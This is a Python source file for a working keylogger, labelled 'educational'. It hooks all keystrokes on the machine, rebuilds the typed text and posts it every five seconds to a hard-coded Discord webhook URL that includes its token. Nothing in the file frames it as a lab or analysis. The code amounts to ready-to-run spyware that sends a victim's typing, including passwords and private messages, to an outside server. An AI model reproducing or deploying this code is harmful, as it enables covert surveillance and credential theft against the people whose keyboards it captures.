import keyboard
import requests
import threading
import time
from datetime import datetime

class EducationalKeylogger:
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url
        self.current_word = ""
        self.buffer = []
        self.modifier_keys = {"alt", "ctrl", "shift", "windows"}
        self.key_mappings = {
            ("alt", "q"): "@",
            ("alt", "2"): "€",
            ("alt", "3"): "#",
            # Add more custom mappings as needed
        }
        self.modifier_pressed = set()
        self.is_running = False
        self.send_timer = None

    def start(self):
        """Start the keylogger"""
        self.is_running = True
        keyboard.hook(self.callback)
        self.schedule_send()
        print("Keylogger started. Press Ctrl+Esc to exit.")
        
        # Add a way to stop the keylogger
        keyboard.wait("ctrl+esc")
        self.stop()

    def stop(self):
        """Stop the keylogger"""
        self.is_running = False
        keyboard.unhook_all()
        if self.send_timer:
            self.send_timer.cancel()
        print("Keylogger stopped.")

    def callback(self, event):
        """Process keyboard events"""
        if not self.is_running:
            return

        if event.event_type == keyboard.KEY_DOWN:
            key_name = event.name.lower()
            
            # Handle modifier keys
            if key_name in self.modifier_keys:
                self.modifier_pressed.add(key_name)
                return
                
            # Check for custom key mappings
            for (mod, k), mapped_char in self.key_mappings.items():
                if mod in self.modifier_pressed and key_name == k:
                    self.process_character(mapped_char)
                    return
            
            # Handle special keys
            if key_name == "space":
                self.complete_word()
                return
            elif key_name == "enter":
                self.complete_word()
                self.buffer.append("\n")
                return
            elif key_name in ["backspace", "delete"]:
                if self.current_word:
                    self.current_word = self.current_word[:-1]
                return
            elif len(key_name) > 1:  # Other special keys
                return
                
            # Normal character
            if "shift" in self.modifier_pressed:
                key_name = key_name.upper()
            
            self.process_character(key_name)
            
        elif event.event_type == keyboard.KEY_UP:
            key_name = event.name.lower()
            if key_name in self.modifier_keys:
                self.modifier_pressed.discard(key_name)

    def process_character(self, char):
        """Add character to the current word"""
        self.current_word += char

    def complete_word(self):
        """Complete the current word and add to buffer"""
        if self.current_word:
            self.buffer.append(self.current_word)
            self.current_word = ""
        self.buffer.append(" ")

    def schedule_send(self):
        """Schedule periodic sending of logged data"""
        if not self.is_running:
            return
            
        # Complete any pending word
        if self.current_word:
            tmp_word = self.current_word
            self.current_word = ""
            self.buffer.append(tmp_word)
            
        # Send data if buffer has content
        if self.buffer:
            self.send_data()
            
        # Schedule next send
        self.send_timer = threading.Timer(5.0, self.schedule_send)
        self.send_timer.daemon = True
        self.send_timer.start()

    def send_data(self):
        """Send logged data to Discord webhook"""
        if not self.buffer:
            return
            
        text = "".join(self.buffer)
        if not text.strip():
            self.buffer = []
            return
            
        # Format specifically for Discord webhook
        data = {
            "content": f"**Keylogger Entry** ({datetime.now().strftime('%Y-%m-%d %H:%M:%S')})\n```\n{text}\n```"
        }
        
        try:
            headers = {
                "Content-Type": "application/json"
            }
            response = requests.post(self.webhook_url, json=data, headers=headers, timeout=5)
            if response.status_code == 204:  # Discord returns 204 No Content on success
                print(f"Data sent successfully to Discord")
            else:
                print(f"Failed to send data. Status code: {response.status_code}")
                if response.text:
                    print(f"Response: {response.text}")
        except Exception as e:
            print(f"Error sending data: {str(e)}")
            
        self.buffer = []

if __name__ == "__main__":
    # Discord webhook URL
    WEBHOOK_URL = "https://discordapp.com/api/webhooks/1349359087921664103/XJhUMzJj4coQWM455WsjC5jbpx3tVMcbkwyQhHysCGgIUDKB1KaPHQNIxJAoORzJuhOq"
    
    keylogger = EducationalKeylogger(WEBHOOK_URL)
    keylogger.start()